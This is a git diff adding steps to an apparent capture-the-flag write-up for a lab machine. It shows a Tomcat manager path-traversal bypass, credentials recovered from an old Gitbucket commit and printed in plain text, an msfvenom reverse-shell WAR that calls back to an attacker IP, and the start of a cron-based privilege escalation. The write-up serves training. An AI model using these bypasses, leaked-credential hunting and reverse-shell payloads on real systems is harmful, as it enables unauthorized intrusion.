@@ -171,43 +171,99 @@ I strongly recommend reading this report made by Orange Tsai:
 ```
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
 ```
-![obraz](https://github.com/user-attachments/assets/93b0d5e5-9e54-435d-aa18-8675a6048eda)
+![obraz](https://github.com/user-attachments/assets/93b0d5e5-9e54-435d-aa18-8675a6048eda)  
+
+Allows us to do directory traversal and access manager without 403 access denied.  
++  https://10.10.10.250/x/..;/manager/  
+
+![obraz](https://github.com/user-attachments/assets/ec6285be-7b1d-485f-9368-e9c139a9a598)
+
+Bypass worked but default credentials didn't (I tried tomcat:tomcat and some other ones)  
 
 
 
 
+## Gitbucket - Deeper Enumeration  
+
+When enumerating a repository it's always a good idea to look at previous commits.  
+Go to commits, there are two that are intresting:  
++ Updating tomcat configuration   
++ Adding tomcat configuration  
+
+It could have had credentials before "Updating tomcat configuration".  
+Click on "browse files", and go to ->   seal_market/tomcat/tomcat-users.xml  
+
+![obraz](https://github.com/user-attachments/assets/62c854d3-11cb-427a-84bd-729ff339518b)
+
+Luckily for us it had credentials.  
++ tomcat:42MrHBf*z8{Z%  
+
+![obraz](https://github.com/user-attachments/assets/b8b89e2d-b7b2-42b4-8ccb-03c19bc31c35)
+
+
+
+## Gaining a Shell via the Tomcat Manager Interface  
+
+In tomcat we can upload .war files to deploy java based applications.  
+Our goal is to upload a reverse shell, first we need to generate malicious file:  
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9005 -f war -o shell.war
+```
+
+Now select our file and click on deploy.  
+
+![obraz](https://github.com/user-attachments/assets/9cc728e6-a6fa-4a74-8db0-b8457ec3424c)
+
+Unfortunately we get access denied once again.  
+
+![obraz](https://github.com/user-attachments/assets/dc78024d-b535-4276-8f68-dd3f37e5f05c)
+
+To bypass it we need to catch request with burpsuite and change path:
+
++  /x/..;/manager/html/upload
+
+Change it to: 
+
++  /manager/x/..;/html/upload
+
+![obraz](https://github.com/user-attachments/assets/5469e458-1ec2-4c21-85d8-2fdb086f16d5)
+
+Now we successfully deployed app called /shell:  
+
+![obraz](https://github.com/user-attachments/assets/d9c4a805-337b-47ad-8470-1fb8ae1600d7)
+
+To get a shell we need to start a listener and click on /shell  
+
+![obraz](https://github.com/user-attachments/assets/7f02b6a4-1e15-4a9a-943c-a69c434a398d)
 
 
 
 
+## Priv esc to Luis
 
+I did some basic enumeration.  
+There is gitbucket.war in home directory.  
+/opt has backups directory in it.  
+There is also an ansible playbook.  
+It suggests that there may be something running as a cron job, let's check for that with pspy64.  
 
+![obraz](https://github.com/user-attachments/assets/8eb8225c-c054-474b-9bb2-adc29d9580d5)
 
+After some time we can see a cron job running as luis:  
 
+![obraz](https://github.com/user-attachments/assets/52c0d51b-59b8-42a9-a499-d86d95090710)
 
+It runs ansible playbook:  
+```
+ python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
+```
+Ansible uses playbooks that are written in .yml  
+Let's take a look at playbook that runs every minute.  
 
+![obraz](https://github.com/user-attachments/assets/57f13ac3-bfa0-4e9c-b020-790a391afca4)  
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+It is copying files from webroot to /opt/backups/files:  
++  /var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes  
 
 
 
